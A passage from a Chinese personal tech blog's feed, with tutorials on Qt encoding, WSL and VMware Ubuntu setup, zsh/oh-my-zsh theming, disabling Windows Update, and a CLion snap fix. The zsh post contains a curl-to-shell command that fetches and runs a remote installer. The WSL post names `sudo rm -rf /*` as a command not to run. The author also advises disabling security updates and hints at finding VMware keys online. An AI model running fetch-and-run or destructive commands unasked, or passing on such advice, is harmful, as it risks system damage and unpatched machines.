title="关于中文乱码"></a>关于中文乱码</h2><blockquote><p>这里创建的项目的时候好像选了qmake编译，不知道是不是这个问题，cmake的区别暂时也不知道。除此之外就是选的msvc编译器，没准是这个的锅，因为微软就比较喜欢ANSI和UNICODE这俩，但是实际上utf-8大部分软件用的比较多。</p></blockquote><p>我们的配置一般是，编译器的语言按照china，或者system，对于windows地区选了中国那这俩就一样。<br>然后下面的textcode 一般也选system，这个选中文的化地下的工具栏会乱码挺恶心的。</p><p>然后就是给控件从代码上设置中文加了u8和什么修饰都无效的话，可以尝试下在.pro文件下加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">##pro文件中，解决中文乱码</span><br><span class="line">msvc &#123;</span><br><span class="line">      QMAKE_CFLAGS += /utf-8</span><br><span class="line">      QMAKE_CXXFLAGS += /utf-8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="未完结-待续"><a href="#未完结-待续" class="headerlink" title="未完结~待续"></a>未完结~待续</h2><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>瞎写就完事，不知道再翻在百度。<br>因为ui这种东西自己不做一遍或者不看看视频，理解起来就比较抽象；并且这个方法有很多，不是我这个初学者一句两句能说清的。<br>网上也有电子书看得进去也可以。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ubuntu】windows子系统</title>
      <link href="/2021/08/28/WindowsSubSystem/"/>
      <url>/2021/08/28/WindowsSubSystem/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于linux而言，如非百分百要吃到显卡或者cpu的性能，一般可考虑虚拟机或者子系统</p><span id="more"></span><p>虚拟机最大的优点就是兼容性，可以直接上桌面版，而且不用过多的配置，只需要选择分配核心数硬盘大小运存等等，最后塞个镜像。<br>而子系统，wsl2据说是可以使用桌面版并且支持nvidia的功能，但最主要还是gui这种图形化的软件。但是对我而言子系统倒是不需要桌面，直接拿来用比较适合学习命令行。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><ul><li>系统：win10</li><li>linux子系统：ubuntu18.04.5 lts</li><li>cmd还是windows terminal都行，后者好像改名叫终端了</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="第一步：控制面板找到程序打开Linux子系统选项"><a href="#第一步：控制面板找到程序打开Linux子系统选项" class="headerlink" title="第一步：控制面板找到程序打开Linux子系统选项"></a>第一步：控制面板找到程序打开Linux子系统选项</h3><img src="/2021/08/28/WindowsSubSystem/000.png" class=""><p>建议重启，然后在去商店安装Ubuntu</p><hr><h3 id="第二步：商店下载子系统"><a href="#第二步：商店下载子系统" class="headerlink" title="第二步：商店下载子系统"></a>第二步：商店下载子系统</h3><img src="/2021/08/28/WindowsSubSystem/001.png" class=""><p>20和18的问题倒不是很大，喜欢新的就上新的。</p><hr><h3 id="第三步：下载个终端，可以忽略"><a href="#第三步：下载个终端，可以忽略" class="headerlink" title="第三步：下载个终端，可以忽略"></a>第三步：下载个终端，可以忽略</h3><img src="/2021/08/28/WindowsSubSystem/002.png" class=""><p>比较恶心的就是，商店搜索还是叫windows terminal，而不知道是不是系统问题选了中文，这个软件都叫终端了。</p><hr><h3 id="第四步：打开完成基础配置"><a href="#第四步：打开完成基础配置" class="headerlink" title="第四步：打开完成基础配置"></a>第四步：打开完成基础配置</h3><p>可以通过windows菜单找到<br>也可以直接搜索找到</p><p>问题不大，第一次打开默认是用cmd的。</p><img src="/2021/08/28/WindowsSubSystem/003.png" class=""><p>你需要配置用户名,记住不要太短，我记得好像有要求的<br>然后就是密码，输入的时候是不可见状态，两次输入都要一致，最后弹出信息即可。</p><hr><h3 id="第五步：用终端打开，喜欢cmd的无所谓"><a href="#第五步：用终端打开，喜欢cmd的无所谓" class="headerlink" title="第五步：用终端打开，喜欢cmd的无所谓"></a>第五步：用终端打开，喜欢cmd的无所谓</h3><img src="/2021/08/28/WindowsSubSystem/004.png" class=""><p>终端可以分页使用，不然打开多个窗口零零散散的麻烦。<br>而且字体有些东西改起来方便点哈哈。。也算是小小的美化病</p><hr><h3 id="第六步：换源"><a href="#第六步：换源" class="headerlink" title="第六步：换源"></a>第六步：换源</h3><p>为什么要换源，源是什么？<br>按照个人理解，源就相当于软件商店的服务器地址。<br>因默认是国外的源，所以下载软件还是更新都很慢，这个懂得都懂，你要有科技也无所谓。</p><p>清华源：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="meta"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="meta"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="meta"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="meta"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br></pre></td></tr></table></figure><p>阿里云：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multivers</span><br></pre></td></tr></table></figure><p>中科大源：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br></pre></td></tr></table></figure><p>以上都是国内的源问题不大。</p><img src="/2021/08/28/WindowsSubSystem/005.png" class=""><p><code>sudo vim /etc/apt/sources.list</code></p><p>进去先把高亮的注释掉，也就是在前面加上井号<br>vim使用小技巧，进入后先按<code>i</code>，然后方向键走，修改完之后按下<code>esc</code>，然后按下<code>:</code>,输入<code>wq</code>即为保存退出</p><img src="/2021/08/28/WindowsSubSystem/006.png" class="">这些事都要注释的<p>然后在最后面黏贴我们复制的，快捷键不一样，是<code>ctrl+shift+v</code>哦，或者鼠标右键哈哈</p><p>保存退出后，输入<code>sudo apt update</code>先更新一下仓库。<br>然后<code>sudo apt upgrade</code>下载需要的更新。</p><p>后续下载软件使用<code>sudo apt install 软件名 -y</code>即可，-y是默认表示yes，有些软件安装的时候会提示你yes or no的选项，这个就是直接输入yes的操作。</p><hr><h3 id="每日一遍"><a href="#每日一遍" class="headerlink" title="每日一遍"></a>每日一遍</h3><p>哈哈老梗了，当时有个<code>neofetch</code>的东西，显示个logo还有一些信息，被调侃linux别的学不到，每日上线一边<code>neofetch</code></p><p>下载<code>sudo apt install neofetch -y</code><br>效果图</p><img src="/2021/08/28/WindowsSubSystem/007.png" class=""><hr><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>c盘尽量大一点，因为商店的软件默认都是装c盘的，虽然网上有把子系统移动到别的盘上，但是不确认会有什么问题，加上我自己也没试过所以不建议</li><li>要升级wsl2自己百度，桌面版那些建议直接上虚拟机会更好。</li><li>win11好像在我的电脑里盘符下面可以直接看到linux，也就是说，可以图形化的拖动文件？！</li><li>其实主要子系统还是学习一下，可以在上面开发一些东西，或者学习shell</li><li>不要<code>sudo rm -rf /*</code></li></ol><hr><h2 id="几个小建议"><a href="#几个小建议" class="headerlink" title="几个小建议"></a>几个小建议</h2><ol><li>先学一些linux基础命令</li><li>了解一下linux用户体系，root和普通用户，这也是为什么要加sudo提权的缘由</li><li>然后自己找路子</li></ol><hr><h2 id="后期"><a href="#后期" class="headerlink" title="后期"></a>后期</h2><p>对于默认的解释器bash而言，功能比较糙。<br>我以前双系统的时候是选择zsh+ohmyzsh+powerlevelp10k这样搭配，玩的话一点哈哈<br>至于vim插件，主要是下的忒慢了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>对了卸载子系统请移驾<code>power shell</code><br>执行<code>wslconfig</code>会有相应的提示<br>其中<code>wslconfig /list</code>用于查看已安装的子系统<br><code>wslconfig /unregister name</code>用于卸载，记住后面的名字要跟list出来的对的上</p><blockquote><p>记住，任何大改动的地方修改完后都建议重启一下</p></blockquote><p>安装其实就那回事，如果安装不顺利请根据错误自行百度培养能力！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ubuntu】虚拟机安装</title>
      <link href="/2021/07/30/ubuntu-install/"/>
      <url>/2021/07/30/ubuntu-install/</url>
      
        <content type="html"><![CDATA[<h1 id="环境-x2F-软件"><a href="#环境-x2F-软件" class="headerlink" title="环境&#x2F;软件"></a>环境&#x2F;软件</h1><ul><li>VMware Workstation-16</li><li>ubuntu-20.04-desktop-amd64.iso</li><li>windows10</li></ul><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><strong>对于双系统：</strong>amd的本子不是很推荐安装，因为苏妈没打钱，linux对amd的cpu核显有点糟糕，n卡就更别提了，新手不留意就会导致n卡掉了。</p><p>有需要可以划到下面<code>参考文章参考文献</code>一栏</p><hr><h2 id="iso下载"><a href="#iso下载" class="headerlink" title="iso下载"></a>iso下载</h2><p><a href="https://cn.ubuntu.com/?_ga=2.25907707.755102826.1650717944-1862494021.1649075648">中文站</a><br><a href="https://ubuntu.com/">正常官网</a></p><p>如果使用edge或者chrome就无所谓，反正能网页翻译。<br>找到下载或者download，去下载桌面系统即可。</p><p>这里需要强调一个问题，就是服务器毕竟是海外的，所以你在官网下载会很慢，除非你有科学道具[梯子]，或者你可以用迅雷下载。如果不想安装的那么我们可以去国内大学镜像站，例如<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学</a></p><p>这里直接到20.04那块<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/20.04/">戳此处</a><br>看到desktop-amd64.iso即可</p><hr><h2 id="vm下载"><a href="#vm下载" class="headerlink" title="vm下载"></a>vm下载</h2><p><a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">戳此处</a></p><img src="/2021/07/30/ubuntu-install/000.png" class=""><p>点击下载，安装过程就不做太多介绍了<br>激活码网上一搜都是，或者使用player版本，那个好像免费的。</p><hr><h2 id="新建虚拟机"><a href="#新建虚拟机" class="headerlink" title="新建虚拟机"></a>新建虚拟机</h2><img src="/2021/07/30/ubuntu-install/001.png" class=""><p>点击创建新的虚拟机或者ctrl+n都一样。</p><img src="/2021/07/30/ubuntu-install/002.png" class=""><blockquote><p>这里典型和自定义都无所谓，自定义就是会更详细，对于新手用不到</p></blockquote><img src="/2021/07/30/ubuntu-install/003.png" class=""><blockquote><p>选择稍后安装，避免等会还要先调整分配的硬件资源</p></blockquote><img src="/2021/07/30/ubuntu-install/004.png" class=""><blockquote><p>至于这里就直接选linux和ubuntu，没用太多详细的版本，默认都没啥事的</p></blockquote><img src="/2021/07/30/ubuntu-install/005.png" class=""><blockquote><p>设置虚拟机的名称，以及存放的位置。</p></blockquote><img src="/2021/07/30/ubuntu-install/006.png" class=""><blockquote><p>设置磁盘大小，默认拆分成多个。</p></blockquote><img src="/2021/07/30/ubuntu-install/007.png" class=""><blockquote><p>如果还想调整，就点击自定义硬件</p></blockquote><img src="/2021/07/30/ubuntu-install/008.png" class=""><blockquote><p>默认都是正常的，除非你想减小分给虚拟机的内存和处理器。</p></blockquote><p>确认无误后：</p><img src="/2021/07/30/ubuntu-install/009.png" class=""><img src="/2021/07/30/ubuntu-install/010.png" class=""><blockquote><p>选择你之前下载镜像的文件夹位置。然后即可点击启动虚拟机</p></blockquote><img src="/2021/07/30/ubuntu-install/011.png" class=""><blockquote><p>20.04开始会检测一下系统文件，并不打紧。</p></blockquote><img src="/2021/07/30/ubuntu-install/012.png" class=""><blockquote><p>安装前我们先断开网络，因为默认镜像源处于国外，你联网系统默认会在安装时更新，到时候要等半天。</p></blockquote><img src="/2021/07/30/ubuntu-install/013.png" class=""><blockquote><p>断开后我们选择 install</p></blockquote><img src="/2021/07/30/ubuntu-install/014.png" class=""><img src="/2021/07/30/ubuntu-install/015.png" class=""><blockquote><p>这里你选择英语和中文都没啥关系，进去之后都能改，默认先选英语，点击continue。</p></blockquote><img src="/2021/07/30/ubuntu-install/016.png" class=""><blockquote><p>如果只是简单学习那么就选择下面最小安装即可。</p></blockquote><img src="/2021/07/30/ubuntu-install/017.png" class=""><blockquote><p>清除整块磁盘没事，他就是在我们划分的20g逻辑磁盘上做手脚，而且分配的20g，不是一开始就锁死，而是说文件存储上限会慢慢到20g。</p></blockquote><p>地区就选上海得了。</p><img src="/2021/07/30/ubuntu-install/018.png" class=""><p>用户名和计算机名，密码都自己设置一下，简单学习可以弄简单点。</p><img src="/2021/07/30/ubuntu-install/019.png" class=""><p>接下来就是等他安装然后进入系统。</p><img src="/2021/07/30/ubuntu-install/020.png" class=""><p>安装完后会提示你重启，点击重启下。</p><img src="/2021/07/30/ubuntu-install/021.png" class=""><p>鼠标点进去按下回车</p><p><strong>提示</strong>:前面可能忘了说，在没有安装VMware tools之前，你鼠标点进去发现出不来了，需要按ctrl+alt。</p><img src="/2021/07/30/ubuntu-install/022.png" class=""><blockquote><p>这些全都skip跳过即可</p></blockquote><hr><h4 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h4><p>为什么说要换源呢，源就像一个软件商店一样，linux虽然有图形化的商店，但是不是很好用，建议都在终端敲命令，还能看到哪里缺依赖等报错信息。</p><img src="/2021/07/30/ubuntu-install/023.png" class=""><img src="/2021/07/30/ubuntu-install/024.png" class=""><p>这里随便选择阿里云做示范，选完后会提示输密码，就是之前安装的时候设置的。完成后窗口往左拖动，找到close。</p><img src="/2021/07/30/ubuntu-install/025.png" class=""><p>然后会提示刷新重新检索更新。点击reload。</p><p>然后我们打开终端[快捷键ctrl+alt+t]浅敲两个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt upgrade</span><br></pre></td></tr></table></figure><img src="/2021/07/30/ubuntu-install/026.png" class=""><p>可以看到其实系统以及提示有可用更新了，但是我们先常使用命令完成。</p><img src="/2021/07/30/ubuntu-install/027.png" class=""><p>输入y，代表yes。静静等待下载完毕。</p><hr><h4 id="vm-tools"><a href="#vm-tools" class="headerlink" title="vm tools"></a>vm tools</h4><p>没安装这个之前，你会发现你的ubuntu虚拟机分辨率就那个固定大小，而且不能拖文件进来或者出去<br>点击状态栏的虚拟机，找到安装VMware tools</p><img src="/2021/07/30/ubuntu-install/028.png" class=""><p>看到这个黄色的文件</p><img src="/2021/07/30/ubuntu-install/029.png" class=""><p>直接右击提取发现在这个文件夹下没有写入权限，最省事就是我们直接打开新文件夹拖进去</p><img src="/2021/07/30/ubuntu-install/030.png" class=""><p>然后右击extract here即可，再双击进入文件夹，直到看到install</p><img src="/2021/07/30/ubuntu-install/031.png" class=""><p>我们右击open terminal</p><img src="/2021/07/30/ubuntu-install/032.png" class=""><p>我们输入<code>sudo ./vmware-install.pl</code></p><img src="/2021/07/30/ubuntu-install/034.png" class=""><p>看到提示需要输入yes的就全输入yes，路径如[&#x2F;usr&#x2F;bin]的就回车。如果有问题就重新安装。</p><hr><p>至此基本操作都差不多，剩下就看用途了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>安装倒不是什么技术活，随便记录下。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ubuntu】终端改zsh使用powerlevel10k</title>
      <link href="/2021/07/07/ubuntu-terminal/"/>
      <url>/2021/07/07/ubuntu-terminal/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章是描写对与terminal中对zsh的美化插件过程,适用于ubuntu18.04、20.04，均为自己试验过。</p><hr><span id="more"></span><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-zsh-x2F-ohmyzsh"><a href="#1-zsh-x2F-ohmyzsh" class="headerlink" title="1. zsh&#x2F;ohmyzsh"></a>1. zsh&#x2F;ohmyzsh</h2><p>首先打开terminal，安装<code>zsh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install zsh  <span class="comment">#18.04以后apt可以不带-get了</span></span><br></pre></td></tr></table></figure><p>然后你可以先切换到zsh或者直接安装ohmyzsh作为基础都行，因为安装了ohmyzsh之后默认会改成zsh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#curl</span></span><br><span class="line">$ sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"><span class="comment">#wget</span></span><br><span class="line">$ sh -c <span class="string">&quot;<span class="subst">$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>上述两者为常用项，没有安装可以<code>apt install</code>安装一下。<br>然后就碰到了一个问题，由于<code>raw.githubusercontent.com</code>存在dns污染，很有可能找不到目标。<br>故此我们通过<a href="https://www.ipaddress.com/">ipaddress</a>,输入域名，获取到返回的四个ip。</p><blockquote><p>没记错的话是四个</p></blockquote><p>此处就直接列出来了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">185.199.108.133 raw.githubusercontent.com</span><br><span class="line">185.199.109.133 raw.githubusercontent.com</span><br><span class="line">185.199.110.133 raw.githubusercontent.com</span><br><span class="line">185.199.111.133 raw.githubusercontent.com</span><br></pre></td></tr></table></figure><p>将其写入hosts文件，Linux下路径为<code>/etc/hosts</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/hosts</span><br><span class="line"><span class="comment">#如果没有vim，请先apt install vim使用</span></span><br></pre></td></tr></table></figure><p>修改完之后重复之前的命令，能够正确下载并执行即可。到底终端已经变成ohmyzsh为主题，如果没有可以尝试注销或重启。</p><hr><h2 id="2-powerlevel10k"><a href="#2-powerlevel10k" class="headerlink" title="2. powerlevel10k"></a>2. powerlevel10k</h2><p>然后是比较花里胡哨的主题<code>powerlevle10k</code><br>默认情况下terminal是不支持花里胡哨的字体的，有科学道具的可以上github访问<a href="https://github.com/romkatv/powerlevel10k#meslo-nerd-font-patched-for-powerlevel10k">powerlevel10k</a>,找到font那块，去下载一个完整的字体包。没有条件的可以先安装一个简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install fonts-powerline</span><br></pre></td></tr></table></figure><p>然后根据步骤下面<code>git clone</code>文件，没有安装的也先apt install git。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --depth=1 https://gitee.com/romkatv/powerlevel10k.git ~/powerlevel10k</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;source ~/powerlevel10k/powerlevel10k.zsh-theme&#x27;</span> &gt;&gt;~/.zshrc</span><br><span class="line"><span class="comment">#此处copy的国内gitee，会快很多</span></span><br><span class="line">$ git <span class="built_in">clone</span> --depth=1 https://gitee.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure><blockquote><p>到此基本没啥问题了，在选择p10k的主题时注意选择unicode编码，不然无法显示特殊字体</p></blockquote><hr><h2 id="3-插件"><a href="#3-插件" class="headerlink" title="3.插件"></a>3.插件</h2><p>个人觉得这个插件用处还是挺大的，功能就是会记忆以前输过的指令，以灰色字样，你可以tab快速对齐。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>将文件下载到ohmyzsh目录下后，需修改<code>~/.zshrc</code>已启用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编辑~/.zshrc   </span></span><br><span class="line">$ vim ~/.zshrc   </span><br><span class="line"><span class="comment">#-------------------------------------</span></span><br><span class="line"><span class="comment"># 在plugins后括号里添加安装的插件名字</span></span><br><span class="line">plugins=( git </span><br><span class="line">          zsh-autosuggestions </span><br><span class="line">            )</span><br><span class="line"><span class="comment"># :wq保存并退出</span></span><br><span class="line"><span class="comment"># 最后刷新</span></span><br><span class="line">$ <span class="built_in">source</span> ~/.zshrc  </span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>按照步骤正常一般无问题，如果zsh先装了p10k再装ohmyzsh的话，可能默认的插件功能会没下过来<br>原文是我在csdn上写的，因为自己开博客了搬回来用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>winUpdate</title>
      <link href="/2021/02/21/winUpdate/"/>
      <url>/2021/02/21/winUpdate/</url>
      
        <content type="html"><![CDATA[<h1 id="卡win10更新"><a href="#卡win10更新" class="headerlink" title="卡win10更新"></a>卡win10更新</h1><span id="more"></span><hr><h1 id="虽然不知道有没有得用，凑合玩玩也是百度的"><a href="#虽然不知道有没有得用，凑合玩玩也是百度的" class="headerlink" title="虽然不知道有没有得用，凑合玩玩也是百度的"></a>虽然不知道有没有得用，凑合玩玩也是百度的</h1><hr><h2 id="禁用windows-update"><a href="#禁用windows-update" class="headerlink" title="禁用windows update"></a>禁用windows update</h2><ol><li>win+r 打开 运行，输入<code>services.msc</code>，回车</li><li>找到windows Update，双击打开点击停止，将启动类型选为“禁用”，点击应用</li><li>切到恢复选项，将默认的重新启动服务改为误操作，点击应用，然后确定</li></ol><hr><h2 id="修改组策略"><a href="#修改组策略" class="headerlink" title="修改组策略"></a>修改组策略</h2><ol><li>win+r 打开运行，输入<code>gpedit.msc</code>，回车</li><li>在编辑器中，依次展开计算机配置-管理模板-windows组件-windows更新</li><li>找到配置自动更新设置，点击编辑策略设置，将其设置为已禁用，然后点击应用，点击确定</li><li>之后还需要再找到“删除使用所有Windows更新功能的访问权限”，选择已启用，完成设置后，点击应用，点击确定。</li></ol><hr><h2 id="禁用任务计划"><a href="#禁用任务计划" class="headerlink" title="禁用任务计划"></a>禁用任务计划</h2><ol><li>win+r打开运行，输入<code>taskschd.msc</code>，回车</li><li>依次展开任务计划程序库 -&gt; Microsoft -&gt; Windows -&gt; WindowsUpdate，里面可能有两个或者一个，选中一个点击设置为禁用</li></ol><hr><h2 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h2><ol><li>win+r 打开运行，输入<code>regedit</code>，回车</li><li>依次展开[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UsoSvc]先找到start，点击修改，选择十六进制，值改为<code>4</code>。</li><li>然后找到<code>FailureActions</code>，右击修改二进制数据，将0018那行的第三组数据改为<code>00</code></li></ol><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>具体效果不好说，但是至少看到windows更新受到限制。</p><img src="/2021/02/21/winUpdate/000.png" class=""><p><strong>目的只是记录，免得下次改不回来</strong></p><p>禁用更新的初衷是太频繁了，虽然有些更新是好的补丁，但是有些就不好说了，而且更新不一定就好，也会出问题，所以选个版本卡死就行。不确定的就像我这样记录下来以免下次出问题改回去。</p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【ubuntu】无法打开snap安装的clion</title>
      <link href="/2021/02/06/ubuntu-clion/"/>
      <url>/2021/02/06/ubuntu-clion/</url>
      
        <content type="html"><![CDATA[<h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><ul><li>ubuntu 20.04</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>snap安装的clion和idea图标存在但是无法打开</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo snap remove clion</span><br></pre></td></tr></table></figure><p>本来想先通过snap remove卸载掉看看的，然后发现报错了：</p><blockquote><p>(eval):1: _snap: function definition file not found</p></blockquote><p>网上搜索了一下，好像没用特别符合的情况</p><p>官网下载安装肯定和snap不一样，然后只能去看看snap目录下是不是卸载的时候误删了什么。<br>找了一圈别人正常的情况，发现少了个snapd。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install snapd</span><br></pre></td></tr></table></figure><p>重新安装了一下，结果就正常了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>当时可能软件下来下去，环境弄来弄去，删除的时候可能不小心全带走了。<br>不过Linux该折腾就还是得折腾几下。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clion控制台中文乱码</title>
      <link href="/2021/01/30/cliontoutf-8/"/>
      <url>/2021/01/30/cliontoutf-8/</url>
      
